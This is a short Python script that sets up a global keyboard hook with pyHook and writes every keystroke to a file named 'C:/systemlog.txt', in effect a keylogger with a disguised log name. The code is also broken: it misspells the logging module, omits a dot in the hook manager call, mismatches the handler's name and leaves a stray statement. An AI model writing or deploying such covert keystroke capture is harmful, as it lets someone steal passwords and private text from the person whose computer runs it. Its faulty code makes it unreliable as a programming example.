import pyHook, pythoncom, sys, logging
file_log = 'C:/systemlog.txt'

def OnkeyboardEvent(event):
    loggin.basicConfig(filename=file_log, level=loggin.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
